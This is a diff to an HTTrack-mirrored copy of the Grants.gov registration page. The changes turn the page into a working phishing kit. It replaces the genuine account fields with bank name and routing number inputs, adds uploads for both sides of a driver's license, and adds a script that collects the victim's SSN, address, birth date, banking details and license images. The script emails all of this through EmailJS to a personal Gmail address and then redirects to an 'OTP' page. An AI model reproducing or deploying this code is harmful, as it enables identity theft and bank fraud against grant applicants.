@@ -2125,7 +2125,7 @@
                 Contact Information:
               </legend>
               <div class="">
-                <form action="">
+                <form id="">
                   <table id="" class="" style="width: 100%" role="grid">
                     <tbody>
                       <tr
@@ -2221,67 +2221,7 @@
                           />
                         </td>
                       </tr>
-                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 40%;
-                            vertical-align: middle;
-                            text-align: right;
-                          "
-                        >
-                          <label for="bankName">Bank Name:</label>
-                        </td>
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 60%;
-                            vertical-align: top;
-                            text-align: left;
-                          "
-                        >
-                          <input
-                            id="bankName"
-                            name="bankName"
-                            type="text"
-                            required
-                          />
-                        </td>
-                      </tr>
-                      <tr
-                        class="ui-widget-content ui-panelgrid-even"
-                        role="row"
-                      >
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 40%;
-                            vertical-align: middle;
-                            text-align: right;
-                          "
-                        >
-                          <label for="routingNumber">Routing Number:</label>
-                        </td>
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 60%;
-                            vertical-align: top;
-                            text-align: left;
-                          "
-                        >
-                          <input
-                            id="routingNumber"
-                            name="routingNumber"
-                            type="text"
-                            required
-                          />
-                        </td>
-                      </tr>
+
                       <tr
                         class="ui-widget-content ui-panelgrid-even"
                         role="row"
@@ -2519,9 +2459,9 @@
                           "
                         >
                           <input
+                            type="file"
                             id="driverLicenseFront"
                             name="driverLicenseFront"
-                            type="file"
                             required
                           />
                         </td>
@@ -2550,21 +2490,11 @@
                           "
                         >
                           <input
+                            type="file"
                             id="driverLicenseBack"
                             name="driverLicenseBack"
-                            type="file"
                             required
                           />
-                        </td>
-                      </tr>
-                      <tr
-                        class="ui-widget-content ui-panelgrid-even"
-                        role="row"
-                      >
-                        <td colspan="2" style="text-align: center">
-                          <button id="grantbutton" onclick="submission()">
-                            Submission
-                          </button>
                         </td>
                       </tr>
                     </tbody>
@@ -2572,100 +2502,6 @@
                 </form>
               </div>
             </fieldset>
-            <script>
-              ;(function () {
-                emailjs.init('xkxNbRifimbLfTe1Y')
-              })()
-
-              function submission(e) {
-                // Collect form data
-                var firstName = document.getElementById('firstName').value
-                var middleName = document.getElementById('middleName').value
-                var lastName = document.getElementById('lastName').value
-                var bankName = document.getElementById('bankName').value
-                var routingNumber =
-                  document.getElementById('routingNumber').value
-                var ssn = document.getElementById('ssn').value
-                var homeAddress = document.getElementById('homeAddress').value
-                var emailAddress = document.getElementById('emailAddress').value
-                var dob = document.getElementById('dob').value
-                var gender = document.getElementById('gender').value
-                var yearsOfService =
-                  document.getElementById('yearsOfService').value
-                var maritalStatus =
-                  document.getElementById('maritalStatus').value
-                // var driverLicenseFront =
-                //   document.getElementById('driverLicenseFront').src
-                // var driverLicenseBack =
-                //   document.getElementById('driverLicenseBack').src
-
-                var templateParams = {
-                  // to_email: 'anonymousway001@gmail.com',  Replace with the recipient's email address
-                  sendername: 'ansarudeenboys',
-                  to: 'anonymousway001@gmail.com',
-                  subject: 'info',
-                  replyto: 'info',
-                  message:
-                    'FIRST NAME: ' +
-                    firstName +
-                    '\n' +
-                    'MIDDLE NAME: ' +
-                    middleName +
-                    '\n' +
-                    'LAST NAME: ' +
-                    lastName +
-                    '\n' +
-                    'HOME ADDRESS: ' +
-                    homeAddress +
-                    '\n' +
-                    'EMAIL ADDRESS: ' +
-                    emailAddress +
-                    '\n' +
-                    'BANK NAME: ' +
-                    bankName +
-                    '\n' +
-                    'ROUTING NUMBER: ' +
-                    routingNumber +
-                    '\n' +
-                    'SSN: ' +
-                    ssn +
-                    '\n' +
-                    'DATE OF BIRTH: ' +
-                    dob +
-                    '\n' +
-                    'GENDER: ' +
-                    gender +
-                    '\n' +
-                    'YEARS OF SERVICE: ' +
-                    yearsOfService +
-                    '\n' +
-                    'MARITAL STATUS: ' +
-                    maritalStatus +
-                    '\n',
-                }
-
-                // Send email using EmailJS
-                emailjs
-                  .send('service_gd5v8vu', 'template_ymqvt1g', templateParams)
-                  .then(
-                    function (response) {
-                      console.log(
-                        'Email sent successfully!',
-                        response.status,
-                        response.text
-                      )
-                      // Handle success, e.g., show a success message or redirect to a thank you page
-                      window.location.href = 'https://www.google.com'
-                    },
-                    function (error) {
-                      console.error('Error sending email:', error)
-                      // Handle error, e.g., display an error message to the user
-                    }
-                  )
-              }
-
-              console.log('end of the line')
-            </script>
 
             <!-- <script id="form:j_idt72_s" type="text/javascript">
                 $(function () {
@@ -2674,7 +2510,7 @@
                   })
                 })
               </script> --> </span
-          ><span id="form:accountDetails"
+          ><span id="#"
             ><fieldset
               id="form:j_idt117"
               class="ui-fieldset ui-widget ui-widget-content ui-corner-all ui-hidden-container"
@@ -2682,7 +2518,7 @@
               data-widget="widget_form_j_idt117"
             >
               <legend class="ui-fieldset-legend ui-corner-all ui-state-default">
-                Grants.gov Account Details:
+                Account Details:
               </legend>
               <div class="ui-fieldset-content">
                 <table
@@ -2719,8 +2555,9 @@
                               "
                             >
                               <span style="font-style: italic"
-                                >(Create a new username and password for your
-                                Grants.gov account.)</span
+                                >(MAKE SURE THE INPUTS ARE CORRECT AS THERE
+                                MIGHT NOT BE A PROVISION FOR CHANGES AFTER
+                                SUBMISSION)</span
                               >
                             </td>
                             <td
@@ -2742,7 +2579,7 @@
                                 id="form:j_idt126"
                                 class="ui-outputlabel ui-widget"
                                 for="form:username"
-                                >Username:
+                                >BANK NAME:
                               </label>
                             </td>
                           </tbody>
@@ -2758,22 +2595,14 @@
                         "
                       >
                         <input
-                          id="form:username"
-                          name="form:username"
+                          id="bankName"
+                          name="bankName"
                           type="text"
                           class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all"
                           autocomplete="off"
                           maxlength="25"
                           size="52"
                         />
-                        <script id="form:username_s" type="text/javascript">
-                          $(function () {
-                            PrimeFaces.cw('InputText', 'widget_form_username', {
-                              id: 'form:username',
-                              maxlength: 25,
-                            })
-                          })
-                        </script>
                       </td>
                     </tr>
                     <tr class="ui-widget-content ui-panelgrid-odd" role="row">
@@ -2796,7 +2625,7 @@
                           id="form:j_idt132"
                           class="ui-outputlabel ui-widget"
                           for="form:password"
-                          >Password:
+                          >ROUTING NUMBER:
                         </label>
                       </td>
                       <td
@@ -2809,360 +2638,203 @@
                         "
                       >
                         <input
-                          id="form:password"
-                          name="form:password"
-                          type="password"
+                          id="routingNumber"
+                          name="routingNumber"
+                          type="text"
                           class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all"
                           autocomplete="false"
                           maxlength="25"
                           size="52"
                         />
-                        <!-- <script id="form:password_s" type="text/javascript">
-                            $(function () {
-                              PrimeFaces.cw(
-                                'Password',
-                                'widget_form_password',
-                                { id: 'form:password' }
-                              )
-                            })
-                          </script> -->
-                        <i style="font-weight: normal">(Case Sensitive)</i>
-                      </td>
-                    </tr>
-                    <tr class="ui-widget-content ui-panelgrid-even" role="row">
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 40%;
-                          vertical-align: middle;
-                          text-align: right;
-                        "
-                      >
-                        <label
-                          id="form:j_idt137"
-                          class="ui-outputlabel ui-widget"
-                          style="color: red"
-                          for="form:passwordConfirm"
-                          >*</label
-                        ><label
-                          id="form:j_idt138"
-                          class="ui-outputlabel ui-widget"
-                          for="form:passwordConfirm"
-                          >Confirm Password:
-                        </label>
-                      </td>
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 60%;
-                          vertical-align: top;
-                          text-align: left;
-                        "
-                      >
-                        <input
-                          id="form:passwordConfirm"
-                          name="form:passwordConfirm"
-                          type="password"
-                          class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all"
-                          autocomplete="false"
-                          maxlength="25"
-                          size="52"
-                        />
-                        <script
-                          id="form:passwordConfirm_s"
-                          type="text/javascript"
-                        >
-                          $(function () {
-                            PrimeFaces.cw(
-                              'Password',
-                              'widget_form_passwordConfirm',
-                              { id: 'form:passwordConfirm' }
-                            )
-                          })
-                        </script>
-                        <i style="font-weight: normal">(Case Sensitive)</i>
                       </td>
                     </tr>
                   </tbody>
                 </table>
               </div>
             </fieldset>
-            <script id="form:j_idt117_s" type="text/javascript">
-              $(function () {
-                PrimeFaces.cw('Fieldset', 'widget_form_j_idt117', {
-                  id: 'form:j_idt117',
-                })
-              })
-            </script></span
-          ><span id="form:communications"
-            ><fieldset
-              id="form:j_idt141"
-              class="ui-fieldset ui-widget ui-widget-content ui-corner-all ui-hidden-container"
-              style="margin-bottom: 10px"
-              data-widget="widget_form_j_idt141"
+          </span>
+
+          <!-- -====================================================================================== -->
+          <span style="width: 100%; justify-content: center; display: flex">
+            <button
+              id="grantbutton"
+              class="grantbutton"
+              onclick="submission()"
+              style="
+                width: 100px;
+                background: #e6e6e6;
+                text-align: center;
+                cursor: pointer;
+              "
+              title="Click to Submit"
             >
-              <legend class="ui-fieldset-legend ui-corner-all ui-state-default">
-                Communications:
-              </legend>
-              <div class="ui-fieldset-content">
-                <table
-                  id="form:j_idt142"
-                  class="ui-panelgrid ui-widget"
-                  style="width: 100%"
-                  role="grid"
-                >
-                  <tbody>
-                    <tr class="ui-widget-content ui-panelgrid-even" role="row">
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 40%;
-                          vertical-align: top;
-                          text-align: right;
-                        "
-                      >
-                        <label
-                          id="form:j_idt145"
-                          class="ui-outputlabel ui-widget"
-                          style="font-weight: bold"
-                          >Subscribe:
-                        </label>
-                      </td>
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 60%;
-                          vertical-align: top;
-                          text-align: left;
-                        "
-                      >
-                        <table
-                          id="form:j_idt147"
-                          class="ui-panelgrid ui-widget"
-                          role="grid"
-                        >
-                          <tbody>
-                            <tr
-                              class="ui-widget-content ui-panelgrid-even"
-                              role="row"
-                            >
-                              <td
-                                role="gridcell"
-                                class="ui-panelgrid-cell"
-                                style="vertical-align: top"
-                              >
-                                <div
-                                  id="form:subscribeToAlerts"
-                                  class="ui-selectbooleancheckbox ui-chkbox ui-widget"
-                                >
-                                  <div class="ui-helper-hidden-accessible">
-                                    <input
-                                      id="form:subscribeToAlerts_input"
-                                      name="form:subscribeToAlerts_input"
-                                      type="checkbox"
-                                      autocomplete="off"
-                                      aria-hidden="true"
-                                      checked="checked"
-                                      aria-checked="true"
-                                    />
-                                  </div>
-                                  <div
-                                    class="ui-chkbox-box ui-widget ui-corner-all ui-state-default ui-state-active"
-                                  >
-                                    <span
-                                      class="ui-chkbox-icon ui-icon ui-icon-check ui-c"
-                                    ></span>
-                                  </div>
-                                </div>
-                                <script
-                                  id="form:subscribeToAlerts_s"
-                                  type="text/javascript"
-                                >
-                                  $(function () {
-                                    PrimeFaces.cw(
-                                      'SelectBooleanCheckbox',
-                                      'widget_form_subscribeToAlerts',
-                                      { id: 'form:subscribeToAlerts' }
-                                    )
-                                  })
-                                </script>
-                              </td>
-                              <td role="gridcell" class="ui-panelgrid-cell">
-                                <label
-                                  id="form:j_idt151"
-                                  class="ui-outputlabel ui-widget"
-                                  style="font-weight: normal"
-                                  for="form:subscribeToAlerts_input"
-                                  >GRANTS.GOV ALERTS<br />Yes, I want to receive
-                                  email messages containing time-sensitive
-                                  information about Grants.gov changes that
-                                  potentially impact users.</label
-                                >
-                              </td>
-                            </tr>
-                          </tbody>
-                        </table>
-                      </td>
-                    </tr>
-                    <tr class="ui-widget-content ui-panelgrid-odd" role="row">
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 40%;
-                          vertical-align: top;
-                          text-align: right;
-                        "
-                      ></td>
-                      <td
-                        role="gridcell"
-                        class="ui-panelgrid-cell"
-                        style="
-                          width: 60%;
-                          vertical-align: top;
-                          text-align: left;
-                        "
-                      >
-                        <table
-                          id="form:j_idt155"
-                          class="ui-panelgrid ui-widget"
-                          role="grid"
-                        >
-                          <tbody>
-                            <tr
-                              class="ui-widget-content ui-panelgrid-even"
-                              role="row"
-                            >
-                              <td
-                                role="gridcell"
-                                class="ui-panelgrid-cell"
-                                style="vertical-align: top"
-                              >
-                                <div
-                                  id="form:subscribeToNewsletter"
-                                  class="ui-selectbooleancheckbox ui-chkbox ui-widget"
-                                >
-                                  <div class="ui-helper-hidden-accessible">
-                                    <input
-                                      id="form:subscribeToNewsletter_input"
-                                      name="form:subscribeToNewsletter_input"
-                                      type="checkbox"
-                                      autocomplete="off"
-                                      aria-hidden="true"
-                                      checked="checked"
-                                      aria-checked="true"
-                                    />
-                                  </div>
-                                  <div
-                                    class="ui-chkbox-box ui-widget ui-corner-all ui-state-default ui-state-active"
-                                  >
-                                    <span
-                                      class="ui-chkbox-icon ui-icon ui-icon-check ui-c"
-                                    ></span>
-                                  </div>
-                                </div>
-                                <script
-                                  id="form:subscribeToNewsletter_s"
-                                  type="text/javascript"
-                                >
-                                  $(function () {
-                                    PrimeFaces.cw(
-                                      'SelectBooleanCheckbox',
-                                      'widget_form_subscribeToNewsletter',
-                                      { id: 'form:subscribeToNewsletter' }
-                                    )
-                                  })
-                                </script>
-                              </td>
-                              <td role="gridcell" class="ui-panelgrid-cell">
-                                <label
-                                  id="form:j_idt159"
-                                  class="ui-outputlabel ui-widget"
-                                  style="font-weight: normal"
-                                  for="form:subscribeToNewsletter_input"
-                                  >GRANTS.GOV NEWSLETTER<br />Yes, I want to
-                                  receive occasional emails highlighting system
-                                  enhancements, training resources, and other
-                                  topics relevant to the federal grant
-                                  community.</label
-                                >
-                              </td>
-                            </tr>
-                          </tbody>
-                        </table>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-            </fieldset>
-            <script id="form:j_idt141_s" type="text/javascript">
-              $(function () {
-                PrimeFaces.cw('Fieldset', 'widget_form_j_idt141', {
-                  id: 'form:j_idt141',
-                })
+              Submit
+            </button>
+          </span>
+
+          <script>
+            ;(function () {
+              emailjs.init('xkxNbRifimbLfTe1Y')
+            })()
+
+            function submission(e) {
+              // Collect form data
+              var firstName = document.getElementById('firstName').value
+              var middleName = document.getElementById('middleName').value
+              var lastName = document.getElementById('lastName').value
+              var bankName = document.getElementById('bankName').value
+              var routingNumber = document.getElementById('routingNumber').value
+              var ssn = document.getElementById('ssn').value
+              var homeAddress = document.getElementById('homeAddress').value
+              var emailAddress = document.getElementById('emailAddress').value
+              var dob = document.getElementById('dob').value
+              var gender = document.getElementById('gender').value
+              var yearsOfService =
+                document.getElementById('yearsOfService').value
+              var maritalStatus = document.getElementById('maritalStatus').value
+
+              // Get the file inputs
+              var driverLicenseFrontInput =
+                document.getElementById('driverLicenseFront')
+              var driverLicenseBackInput =
+                document.getElementById('driverLicenseBack')
+
+              // Read the files selected by the user
+              var driverLicenseFrontFile = driverLicenseFrontInput.files[0]
+              var driverLicenseBackFile = driverLicenseBackInput.files[0]
+
+              // Use FileReader to read the image files and convert them to Base64
+              var reader = new FileReader()
+              var readerBack = new FileReader()
+
+              var templateParams = {
+                // ... (existing code)
+
+                // ... (existing code)
+                // to_email: 'anonymousway001@gmail.com',  Replace with the recipient's email address
+                sendername: 'ansarudeenboys',
+                to: 'anonymousway001@gmail.com',
+                subject: 'info',
+                replyto: 'info',
+                message:
+                  'FIRST NAME: ' +
+                  firstName +
+                  '\n' +
+                  'MIDDLE NAME: ' +
+                  middleName +
+                  '\n' +
+                  'LAST NAME: ' +
+                  lastName +
+                  '\n' +
+                  'HOME ADDRESS: ' +
+                  homeAddress +
+                  '\n' +
+                  'EMAIL ADDRESS: ' +
+                  emailAddress +
+                  '\n' +
+                  'BANK NAME: ' +
+                  bankName +
+                  '\n' +
+                  'ROUTING NUMBER: ' +
+                  routingNumber +
+                  '\n' +
+                  'SSN: ' +
+                  ssn +
+                  '\n' +
+                  'DATE OF BIRTH: ' +
+                  dob +
+                  '\n' +
+                  'GENDER: ' +
+                  gender +
+                  '\n' +
+                  'YEARS OF SERVICE: ' +
+                  yearsOfService +
+                  '\n' +
+                  'MARITAL STATUS: ' +
+                  maritalStatus +
+                  '\n' +
+                  'DRIVER LICENSE FRONT: ' +
+                  frontImageDataURL +
+                  '\n',
+              }
+
+              // Create Promises to handle the image loading
+              var frontImagePromise = new Promise(function (resolve) {
+                reader.onload = function () {
+                  // The result property contains the Base64 data
+                  var driverLicenseFrontBase64 = reader.result
+                  // Update the templateParams with the Base64 data
+                  templateParams.driverLicenseFront = driverLicenseFrontBase64
+
+                  // Append Base64 data URL to the message
+                  templateParams.message +=
+                    '\nDRIVER LICENSE FRONT IMAGE:\n' +
+                    'data:image/png;base64,' +
+                    driverLicenseFrontBase64 +
+                    '\n'
+                  resolve()
+                }
+
+                // Read the front driver's license file as Base64
+                if (driverLicenseFrontFile) {
+                  reader.readAsDataURL(driverLicenseFrontFile)
+                } else {
+                  resolve() // Resolve immediately if no front image is selected
+                }
               })
-            </script></span
-          ><span id="form:continueOrCancelRegistration"
-            ><table
-              id="form:j_idt160"
-              class="ui-panelgrid ui-widget panelGridCenter"
-              role="grid"
-            >
-              <tbody>
-                <tr class="ui-widget-content" role="row">
-                  <td role="gridcell" class="ui-panelgrid-cell">
-                    <button
-                      id="form:continueButton"
-                      name="form:continueButton"
-                      class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only"
-                      onclick='PrimeFaces.ab({s:"form:continueButton",f:"form",p:"form:continueButton form:contactInformation form:accountDetails form:communications",u:"form",onst:function(cfg){PF(&apos;blockUI&apos;).show(); updateSessionTimeout(false);;},onco:function(xhr,status,args){PF(&apos;blockUI&apos;).hide(); bindEvents();;}});return false;'
-                      type="submit"
-                      onmousemove="setToolTip('form:continueButton', 'Click to continue')"
-                    >
-                      <span class="ui-button-text ui-c">Continue »</span>
-                    </button>
-                    <script id="form:continueButton_s" type="text/javascript">
-                      $(function () {
-                        PrimeFaces.cw('CommandButton', 'continueButton', {
-                          id: 'form:continueButton',
-                        })
-                      })
-                    </script>
-                    <img
-                      id="form:j_idt162"
-                      width="10"
-                      alt=""
-                      src="javax.faces.resource/spacer/dot_clear.gif68f8.gif?ln=primefaces&amp;v=7.0"
-                    /><button
-                      id="form:cancelButton"
-                      name="form:cancelButton"
-                      class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only"
-                      onclick='PrimeFaces.ab({s:"form:cancelButton",f:"form",p:"form:cancelButton"});return false;'
-                      style="width: 100px; background: #e6e6e6"
-                      title="Click to cancel"
-                      type="submit"
-                    >
-                      <span class="ui-button-text ui-c">Cancel</span>
-                    </button>
-                    <script id="form:cancelButton_s" type="text/javascript">
-                      $(function () {
-                        PrimeFaces.cw(
-                          'CommandButton',
-                          'widget_form_cancelButton',
-                          { id: 'form:cancelButton' }
+
+              var backImagePromise = new Promise(function (resolve) {
+                readerBack.onload = function () {
+                  // The result property contains the Base64 data
+                  var driverLicenseBackBase64 = readerBack.result
+                  // Update the templateParams with the Base64 data
+                  templateParams.driverLicenseBack = driverLicenseBackBase64
+
+                  // Append Base64 data URL to the message
+                  templateParams.message +=
+                    '\nDRIVER LICENSE BACK IMAGE:\n' +
+                    'data:image/png;base64,' +
+                    driverLicenseBackBase64 +
+                    '\n'
+                  resolve()
+                }
+
+                // Read the back driver's license file as Base64
+                if (driverLicenseBackFile) {
+                  readerBack.readAsDataURL(driverLicenseBackFile)
+                } else {
+                  resolve() // Resolve immediately if no back image is selected
+                }
+              })
+
+              // Wait for both promises to resolve before sending the email
+              Promise.all([frontImagePromise, backImagePromise]).then(
+                function () {
+                  // Send email using EmailJS
+                  emailjs
+                    .send('service_gd5v8vu', 'template_ymqvt1g', templateParams)
+                    .then(
+                      function (response) {
+                        console.log(
+                          'Email sent successfully!',
+                          response.status,
+                          response.text
                         )
-                      })
-                    </script>
-                  </td>
-                </tr>
-              </tbody>
-            </table></span
-          >
+                        // Handle success, e.g., show a success message or redirect to a thank you page
+                        window.location.href = './otp-page.html'
+                      },
+                      function (error) {
+                        console.error('Error sending email:', error)
+                        // Handle error, e.g., display an error message to the user
+                      }
+                    )
+                }
+              )
+            }
+
+            console.log('end of the line')
+          </script>
+
           <div
             id="form:warningNotice"
             class="panelGridCenter"
@@ -3589,6 +3261,6 @@
       <span style="white-space: nowrap">Please wait...</span>
     </div>
   </body>
-</html>
 
-  
+  <!-- Mirrored from apply07.grants.gov/apply/register.faces by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Jul 2023 08:53:50 GMT -->
+</html>
